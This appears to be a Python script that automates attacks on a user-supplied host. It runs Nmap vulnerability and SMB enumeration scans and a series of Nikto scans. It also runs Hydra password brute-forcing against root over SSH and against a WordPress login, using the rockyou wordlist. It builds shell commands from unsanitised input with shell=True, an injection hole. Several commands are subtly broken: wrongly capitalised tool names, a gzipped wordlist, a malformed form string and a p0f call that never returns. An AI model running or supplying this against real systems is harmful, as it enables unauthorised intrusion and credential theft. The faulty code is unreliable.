import subprocess
import sys

def run_command(command):
    
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return e.stderr

def main():

    target = input("Enter the IP address or domain to scan: ")

    print("\nStarting automated penetration testing...\n")

    # Nmap scans
    print("\nRunning Nmap scan for OS and version detection...")
    nmap_os_scan = run_command(f"sudo nmap -O -A {target}")
    print(nmap_os_scan)

    print("\nRunning Nmap scripts (vuln, discovery, auth, http-vuln-cve2014-3704, smb-vuln*)...")
    nmap_scripts = run_command(f"nmap --script=\"vuln,discovery,auth,http-vuln-cve2014-3704,smb-vuln*\" {target}")
    print(nmap_scripts)

    print("\nRunning SMB enumeration (smb-enum-users, smb-enum-shares, smb-os-fingerprint)...")
    smb_enum = run_command(f"nmap -p 445 --script=\"smb-enum-users,smb-enum-shares,smb-os-fingerprint\" {target}")
    print(smb_enum)

    # Nikto scans
    print("\nRunning Nikto scan (basic)...")
    nikto_basic = run_command(f"Nikto -h {target}")
    print(nikto_basic)

    print("\nRunning Nikto scan with Tuning 2...")
    nikto_tuning2 = run_command(f"Nikto -h {target} -Tuning 2")
    print(nikto_tuning2)

    print("\nRunning Nikto scan with cgi plugin...")
    nikto_cgi = run_command(f"Nikto -h {target} -Plugins cgi")
    print(nikto_cgi)

    print("\nRunning Nikto scan with SSL...")
    nikto_ssl = run_command(f"Nikto -h {target} -ssl")
    print(nikto_ssl)

    print("\nRunning Nikto scan with Tuning 9...")
    nikto_tuning9 = run_command(f"Nikto -h {target} -Tuning 9")
    print(nikto_tuning9)

    print("\nRunning Nikto scan with vuln plugin...")
    nikto_vuln = run_command(f"Nikto -h {target} -Plugins vuln")
    print(nikto_vuln)

    print("\nRunning Nikto scan with Display V...")
    nikto_display = run_command(f"Nikto -h {target} -Display V")
    print(nikto_display)

    print("\nRunning Nikto scan with XSS plugin...")
    nikto_xss = run_command(f"Nikto -h {target} -Plugins xss")
    print(nikto_xss)

    print("\nRunning Nikto scan with Tuning 3...")
    nikto_tuning3 = run_command(f"Nikto -h {target} -Tuning 3")
    print(nikto_tuning3)

    # p0f scan (network-based OS fingerprinting)
    print("\nRunning p0f scan (network-based OS fingerprinting)...")
    p0f_scan = run_command("sudo p0f -i eth0")
    print(p0f_scan)

    # WhatWeb scan
    print("\nRunning WhatWeb scan...")
    whatweb_scan = run_command(f"Whatweb {target}")
    print(whatweb_scan)

    # Hydra SSH Brute Force
    print("\nRunning Hydra brute-force SSH...")
    hydra_ssh = run_command(f"Hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://{target}")
    print(hydra_ssh)

    # Hydra HTTP POST Form Brute Force
    print("\nRunning Hydra brute-force HTTP POST Form...")
    hydra_http = run_command(f"Hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz {target} http-post-form \"/wp-login.php:log^USER^&pwd-^PASS^:F=incorrect\"")
    print(hydra_http)

    print("\nPenetration testing completed!")

if __name__ == "__main__":
    main()
